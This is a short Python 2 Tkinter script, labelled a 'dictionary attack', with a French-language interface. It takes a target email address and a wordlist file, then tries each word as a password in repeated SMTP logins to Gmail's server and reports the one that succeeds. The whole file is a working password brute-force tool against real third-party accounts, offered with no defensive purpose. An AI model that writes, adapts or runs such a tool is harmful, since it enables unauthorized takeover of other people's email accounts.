###########################
#@script DICTIONNARY ATTACK
#@author Jerome - Themee
#@date - 01/03/2016
###########################

# import module 
from Tkinter import *
from tkFileDialog import *
import smtplib
from tkMessageBox import *

#get all informations function and attack
def attack():
	filename = askopenfilename(title="Ouvrir votre document",filetypes=[('txt files','.txt'),('all files','.*')])
	fichier = open(filename, "r")
	content = fichier.readlines()
	nomfichier = fichier.name
	fichier.close()
	Label(fenetre, text=nomfichier).pack(padx=10, pady=10)
	mail = entree.get()

# SMTP connect	
	smtpconnect = smtplib.SMTP("smtp.gmail.com",587)
	smtpconnect.ehlo()
	smtpconnect.starttls()
	for i in content:
		print i
		try:
		  	smtpconnect.login(mail,i)
			mdp = i
			showwarning("le mot de passe est ",i)
			break
		except smtplib.SMTPAuthenticationError:
			print "mot de passe mauvais"

#UI creation
fenetre = Tk()
label = Label(fenetre,text="Etape 1 - Entrez votre email")
label.pack()

value=StringVar()
value.set("Etape 1 - Entrez votre email")
entree = Entry(fenetre, textvariable='string', width=30)
entree.pack()

bouton=Button(fenetre, text="Etape 2 - parcourir", command=attack)
bouton.pack()

fenetre.mainloop()
#end